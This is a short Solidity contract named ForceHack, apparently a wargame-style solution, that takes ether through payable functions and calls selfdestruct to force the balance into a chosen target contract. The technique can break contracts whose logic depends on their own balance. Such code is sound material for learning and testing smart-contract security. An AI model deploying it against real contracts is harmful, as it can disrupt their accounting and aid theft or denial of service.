// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract ForceHack{

    address payable public owner;

    function collect() public returns(uint) {
        return address(this).balance;
    }

    function give() public payable returns(uint) {
        require(msg.value > 0);
        return address(this).balance;
    }
    function selfDestroy(address payable target) payable public {
        require(msg.value>0);
        selfdestruct(target);
    }

}